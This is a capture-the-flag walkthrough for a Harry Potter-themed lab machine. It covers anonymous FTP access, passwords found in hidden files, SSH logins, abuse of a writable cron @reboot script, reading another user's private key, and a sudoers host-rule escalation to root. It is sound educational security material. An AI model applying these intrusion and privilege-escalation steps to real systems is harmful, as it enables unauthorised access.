# CTF: Yer a Wizard

![Contest Date: 2024-05-14](https://img.shields.io/badge/contest%20date-2024--05--14-informational)
![Category: FTP](https://img.shields.io/badge/category-ftp-%237159c1)
![By: Alexandre & Eloi](https://img.shields.io/badge/by-Alexandre%20%26%20Eloi-%23f9a03c)

## Description

> Find out about the secret wizarding school!

## Write-up

The flag is a reference to the Harry Potter series.

UserFlag: user.txt
RootFlag: root.txt


## Flag Solutions

### User Flag

First thing to do is to check open ports on the target machine. We can do this by running a port scan using `nmap`.

```bash
nmap -sSV $IP
```

Results : 
```bash
PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd 3.0.3

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)

MAC Address: 02:A8:16:1F:4E:E7 (Unknown)

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

The target machine has two open ports, 22 and 21. Port 21 is running an FTP server. Let's connect to the FTP server.

We dont have any credentials to connect to the FTP server. We can try to connect as anonymous.

```bash
ftp $IP
```

We are connected to the FTP server.
```
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
We do a `ls -la` to see the files in the FTP server.

```bash
ls -al

200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        113          4096 Jan 24  2022 .
drwxr-xr-x    3 0        113          4096 Jan 24  2022 ..
drwxr-xr-x    2 0        0            4096 Jan 24  2022 ...
-rw-r--r--    1 0        0              81 Jan 24  2022 .hidden
226 Directory send OK.
```

We found a file named `.hidden`. We can download this file to our local machine.

```bash
get .hidden
```

We do a `cat` on the file.

```bash
cat .hidden

I swear that my password is Il0veTheMalefoys, trust me, I'm Hagrid, I never lie!
```
We know the user password. We can try to connect to the SSH server using the credentials we found.

```bash
ssh hagrid@$IP
```

We cant connect beacuse the password is false. Beacause is the Harry Potter series Hagrid dont like the Malefoys.

We see a folder named `...`. It is a hidden folder. We can try to access this folder.

```bash
cd ...
```

We do a `ls -la` to see the files in the folder.

```bash
ls -al

200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jan 24  2022 .
drwxr-xr-x    3 0        113          4096 Jan 24  2022 ..
-rw-r--r--    1 0        0              42 Jan 24  2022 .reallyHidden
226 Directory send OK.
```

We found a file named `.reallyHidden`. We can download this file to our local machine.

```bash
get .reallyHidden
```
We do a `cat` on the file.

```bash
cat .reallyHidden

FINE! My password is IAlreadySaidTooMuch
```

We know the user password. We can try to connect to the SSH server using the credentials we found.

```bash
ssh hagrid@$IP
```

We are connected to the SSH server.

We do a `ls` and we found a file `user.txt`.

```bash
cat user.txt
```

We found a base64 encoded string. We can decode this string.

We go the [CyberChef](https://icyberchef.com/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=Vld4YVExTnRWalpSYmxaT1RWUnNlVmRXVlRGYWJVcHhWR3BLVGsxVmNHMVpWV1JIVmpBd2VFOUljR2xoYTBwWFZERldiMXByTlZWUmExSlVaV3R2TlZFeVl6bFFVVDA5) and we decode the string.

We found the user flag. It was encoded in base64 3 times.

### Root Flag

We do a `ls -la` to see the files in the SSH server.

```bash
ls -la
```

We found a file named `hut.sh`. With permissions to execute. We do a `cat` on the file.

```bash
-rwxrwxr-x 1 hagrid hagrid   34 Jan 23  2022 hut.sh

cat hut.sh

#!/bin/bash

echo "Yer a wizard!"

```

We go to the /home directory and we do a `ls -la` to see the files in the directory.

```bash
cd /home
ls -la

drwxr-xr-x  7 root       root       4096 Jan 24  2022 .
drwxr-xr-x 24 root       root       4096 May 16 08:46 ..
drwx------  3 dumbledore dumbledore 4096 Apr 25  2022 dumbledore
drwxrwxrwx  4 hagrid     hagrid     4096 May 16 08:48 hagrid
drwx--x--x  6 harry      harry      4096 Jan 23  2022 harry
drwx------  2 hermione   hermione   4096 Jan 23  2022 hermione
drwx------  2 ron        ron        4096 Jan 23  2022 ron
```

We do a `cat /etc/crontab` to see the cron jobs.

```bash
@reboot ron bash /home/hagrid/hut.sh
```

We see that the `hut.sh` file is executed at reboot. We can modify the file to execute a chmod 777 on the `/home/ron` directory.

```bash
nano hut.sh

chmod 777 /home/ron
```

But we cant execute the file. We can try `sudo -l` to see if we can execute the file as root.

```bash
sudo -l

User hagrid may run the following commands on hogwarts:
    (root) NOPASSWD: /sbin/reboot
```

We can execute the file as root. We can modify the file to execute a chmod 777 on the `/home/ron` directory.

```bash
sudo -u root /sbin/reboot
```

We are disconnected from the SSH server. We have to wait for the machine to reboot.

After the machine reboots, we can connect to the SSH server again with hagrid credentials.

We do a `cd /home/ron` to go to the `/home/ron` directory.

```bash
cd /home/ron
```

We do a `ls -la` to see the files in the directory.

```bash
ls -la

total 24
drwxrwxrwx 2 ron  ron  4096 Jan 23  2022 .
drwxr-xr-x 7 root root 4096 Jan 24  2022 ..
lrwxrwxrwx 1 root root    9 Jul  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 ron  ron   220 Jul  2  2020 .bash_logout
-rw-r--r-- 1 ron  ron  3771 Jul  2  2020 .bashrc
-rw-r--r-- 1 ron  ron   807 Jul  2  2020 .profile
-rw-r--r-- 1 root root 1807 Jan 23  2022 dumbledore.txt
````

We found a file named `dumbledore.txt`. We can do a `cat` on the file.

```bash
cat dumbledore.txt

e1f22cea2a1c41f047b36b505a6aede84a848209c69505ac17ffdaebd7ba63c98e69f68f755134d7b94d47d0c86c1aea72f39fa4e89457cf8b25f19cd1b2dd33
3984d0b5033258950d886bc760a867399e57d8cc396c74beeaefc51168ccc7d11369e882d2e591619c42192102d550fdebb59db528f88bb46cc1a33a30b0ec0a
1f4be9bd3c61e621ef43bb2e0a2d7836786f730e4e0e6aa546899bceab0571904dfc6efc94c1324b1a22ae446f0a995b533054b1dbd09d0cda03e0985786d59a
c9f4875d9269814e2ddf825ce769cb77702034225818d8cad8d46c6483693fa28b8d4e3e053d1facbd774b1fc5a2b4cc31ef41a1129e58fc149d383dc2f1b647
e75baca2466b6805bdcfc52a12160ffaaf05677dd947c5b3019710d43ea18010fcb6c9ec0cde94efcb23a68bf9c7595798e77f4ff0602f468377d15392465b69
de6bcbd90ff00c604a836fe2a0959c6a86aeabd440d8982970613edff3cd27996cd4a21c005e4dd4dca89c9a5d7a46fa9d97d2b220521dddf3b376fd04f2d0ba
7afc42427607f5171b9db17b38c3953ad5e614955cedbba9cfb97a276f3f3bd83fcfe61bdbfc799ca83865e446f3ae47998a624fd7316e7e56f7b27c9d67f150
263adce0f04ee1eb3e75528ed5251724906bdd44c4265a1cd1185af010a4561e153833d1ea46df69764f2ece8e33199f8d787bf39cc51ebb406f15480c7e780e
7f5a8bf8b1779e4802c8e86dd1ea8e096be633d64eb8b5610ae9267af670734de1bf740427d05d454f5d4080aedf2b0821c1f338cd507e9b0dc9a0145bbff303
806b977f3edfeda024f63584cc232c7b53ca0bba09cf9818346070f6489e775232f19d33390a78ba14f301a41a0c6994c2f7d95be6f6faeff9243f8e38c131f7
1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75
c9f4875d9269814e2ddf825ce769cb77702034225818d8cad8d46c6483693fa28b8d4e3e053d1facbd774b1fc5a2b4cc31ef41a1129e58fc149d383dc2f1b647
b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86
496e20666163742c2074686973207761732073696d706c652c207472756c792c207468652070617373776f72642069732042794d65726c696e4265617264210a
```

We found string encoded in hex. We can decode this string.

We go to the [CyberChef](https://icyberchef.com/#recipe=From_Hex('Auto')&input=ZTFmMjJjZWEyYTFjNDFmMDQ3YjM2YjUwNWE2YWVkZTg0YTg0ODIwOWM2OTUwNWFjMTdmZmRhZWJkN2JhNjNjOThlNjlmNjhmNzU1MTM0ZDdiOTRkNDdkMGM4NmMxYWVhNzJmMzlmYTRlODk0NTdjZjhiMjVmMTljZDFiMmRkMzMKMzk4NGQwYjUwMzMyNTg5NTBkODg2YmM3NjBhODY3Mzk5ZTU3ZDhjYzM5NmM3NGJlZWFlZmM1MTE2OGNjYzdkMTEzNjllODgyZDJlNTkxNjE5YzQyMTkyMTAyZDU1MGZkZWJiNTlkYjUyOGY4OGJiNDZjYzFhMzNhMzBiMGVjMGEKMWY0YmU5YmQzYzYxZTYyMWVmNDNiYjJlMGEyZDc4MzY3ODZmNzMwZTRlMGU2YWE1NDY4OTliY2VhYjA1NzE5MDRkZmM2ZWZjOTRjMTMyNGIxYTIyYWU0NDZmMGE5OTViNTMzMDU0YjFkYmQwOWQwY2RhMDNlMDk4NTc4NmQ1OWEKYzlmNDg3NWQ5MjY5ODE0ZTJkZGY4MjVjZTc2OWNiNzc3MDIwMzQyMjU4MThkOGNhZDhkNDZjNjQ4MzY5M2ZhMjhiOGQ0ZTNlMDUzZDFmYWNiZDc3NGIxZmM1YTJiNGNjMzFlZjQxYTExMjllNThmYzE0OWQzODNkYzJmMWI2NDcKZTc1YmFjYTI0NjZiNjgwNWJkY2ZjNTJhMTIxNjBmZmFhZjA1Njc3ZGQ5NDdjNWIzMDE5NzEwZDQzZWExODAxMGZjYjZjOWVjMGNkZTk0ZWZjYjIzYTY4YmY5Yzc1OTU3OThlNzdmNGZmMDYwMmY0NjgzNzdkMTUzOTI0NjViNjkKZGU2YmNiZDkwZmYwMGM2MDRhODM2ZmUyYTA5NTljNmE4NmFlYWJkNDQwZDg5ODI5NzA2MTNlZGZmM2NkMjc5OTZjZDRhMjFjMDA1ZTRkZDRkY2E4OWM5YTVkN2E0NmZhOWQ5N2QyYjIyMDUyMWRkZGYzYjM3NmZkMDRmMmQwYmEKN2FmYzQyNDI3NjA3ZjUxNzFiOWRiMTdiMzhjMzk1M2FkNWU2MTQ5NTVjZWRiYmE5Y2ZiOTdhMjc2ZjNmM2JkODNmY2ZlNjFiZGJmYzc5OWNhODM4NjVlNDQ2ZjNhZTQ3OTk4YTYyNGZkNzMxNmU3ZTU2ZjdiMjdjOWQ2N2YxNTAKMjYzYWRjZTBmMDRlZTFlYjNlNzU1MjhlZDUyNTE3MjQ5MDZiZGQ0NGM0MjY1YTFjZDExODVhZjAxMGE0NTYxZTE1MzgzM2QxZWE0NmRmNjk3NjRmMmVjZThlMzMxOTlmOGQ3ODdiZjM5Y2M1MWViYjQwNmYxNTQ4MGM3ZTc4MGUKN2Y1YThiZjhiMTc3OWU0ODAyYzhlODZkZDFlYThlMDk2YmU2MzNkNjRlYjhiNTYxMGFlOTI2N2FmNjcwNzM0ZGUxYmY3NDA0MjdkMDVkNDU0ZjVkNDA4MGFlZGYyYjA4MjFjMWYzMzhjZDUwN2U5YjBkYzlhMDE0NWJiZmYzMDMKODA2Yjk3N2YzZWRmZWRhMDI0ZjYzNTg0Y2MyMzJjN2I1M2NhMGJiYTA5Y2Y5ODE4MzQ2MDcwZjY0ODllNzc1MjMyZjE5ZDMzMzkwYTc4YmExNGYzMDFhNDFhMGM2OTk0YzJmN2Q5NWJlNmY2ZmFlZmY5MjQzZjhlMzhjMTMxZjcKMWY0MGZjOTJkYTI0MTY5NDc1MDk3OWVlNmNmNTgyZjJkNWQ3ZDI4ZTE4MzM1ZGUwNWFiYzU0ZDA1NjBlMGY1MzAyODYwYzY1MmJmMDhkNTYwMjUyYWE1ZTc0MjEwNTQ2ZjM2OWZiYmJjZThjMTJjZmM3OTU3YjI2NTJmZTlhNzUKYzlmNDg3NWQ5MjY5ODE0ZTJkZGY4MjVjZTc2OWNiNzc3MDIwMzQyMjU4MThkOGNhZDhkNDZjNjQ4MzY5M2ZhMjhiOGQ0ZTNlMDUzZDFmYWNiZDc3NGIxZmM1YTJiNGNjMzFlZjQxYTExMjllNThmYzE0OWQzODNkYzJmMWI2NDcKYjEwOWYzYmJiYzI0NGViODI0NDE5MTdlZDA2ZDYxOGI5MDA4ZGQwOWIzYmVmZDFiNWUwNzM5NGM3MDZhOGJiOTgwYjFkNzc4NWU1OTc2ZWMwNDliNDZkZjVmMTMyNmFmNWEyZWE2ZDEwM2ZkMDdjOTUzODVmZmFiMGNhY2JjODYKNDk2ZTIwNjY2MTYzNzQyYzIwNzQ2ODY5NzMyMDc3NjE3MzIwNzM2OTZkNzA2YzY1MmMyMDc0NzI3NTZjNzkyYzIwNzQ2ODY1MjA3MDYxNzM3Mzc3NmY3MjY0MjA2OTczMjA0Mjc5NGQ2NTcyNmM2OTZlNDI2NTYxNzI2NDIxMGE) and we decode the string.

We found the password of the user dumbledore. At the end of the file. `In fact, this was simple, truly, the password is ByMerlinBeard!
`

We can try to connect to the SSH server using the credentials we found.

```bash
ssh dumbledore@$IP
```

We are connected to the SSH server.

We do a `ls` and we found a file `note.txt`.

```bash
cat note.txt

Help will always be given at Hogwarts to those who ask for it.

Truth be told, I will always have an eye on you Harry, I can see it all.
```

We need to go the the harry directory. We do a `cd /home/harry` to go to the `/home/harry` directory.

```bash
cd /home/harry
```

We do a `ls -la` to see the files in the directory.

```bash
ls -la

ls: cannot open directory '.': Permission denied
```

We try to show if the .ssh directory is in the harry directory.

```bash
ls -la .ssh
ls: cannot open directory '.ssh': Permission denied
```

We can try to show if `id_rsa` is in the .ssh directory.

```bash
cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
NIRchPaFUqJXQZi5ryQH6YxZP5IIJXENK+a4WoRDyPoyGK/63rXTn/IWWKQka9tQ
2xrdnyxdwbtiKP1L4bq/4vU3OUcA+aYHxqhyq39arpeceHVit
```

We found a private key. We can try to connect to the SSH server using the private key.

We save the private key in a file named `id_rsa`.

```bash
ssh harry@$IP -i .ssh/id_rsa
```

We are connected to the SSH server.

We need to search in the `/` directory. We do a `cd /` to go to the `/` directory. And search all references to the word `harry` in all files.

```bash
grep -rni "harry" * 2>/dev/null

etc/passwd-:30:harry:x:1005:1005:Alice,,,:/home/harry:/bin/bash

etc/group-:52:harry:x:1005:

etc/sudoers.d/harry:1:harry strawgoh = (root) NOPASSWD: /bin/bash

etc/group:52:harry:x:1005:

etc/passwd:30:harry:x:1005:1005:Alice,,,:/home/harry:/bin/bash
```

We found a file named `sudoers.d/harry`. Who has permissions to execute `/bin/bash` as root. With hostname `strawgoh`.

```bash
sudo -h strawgoh /bin/bash
```

We are connected as root. We do a `cd /root` to go to the `/root` directory. And we do a `ls -al` to see the files in the directory.

```bash
cd /root
ls 

root.txt

cat root.txt
```

We put the text in ([CyberChef](https://icyberchef.com/#recipe=From_Hex('None')From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base32('A-Z2-7%3D',false)&input=NTM1NjVhNGE1MjU2NGQzMjRkMzE1NjQ4NTQ2YjU2NDc0ZTZhNTY0NDU1MzAzOTU3NTMzMDY0NTI1NzQ2NzA1MzUzMzE0YTUxNTY0NTRlNGY1MzdhNjQ0ODU1NmM0MjU1NTU1NTMxNjE1NjU1Mzk1NzRkNmI1MjQ0NTc2YzRlNTc1MzZjNGE1MTU2NDU2YjdhNTUzMDU2NGQ0ZTU0NGE0NTUyN2E1MjU1NTUzMDY0NDY0ZTQ1NTY1YTU0NTQ0OTMzNTQzMTRhNTY1MjQ1NGQ3YTU1NmM3MDUxNTY1NTVhNDI1MDU0MzAzOTUwNTEzZDNk)) and we decode the string.

We found the root flag. It was encoded in Base32, Base64 and Hex.




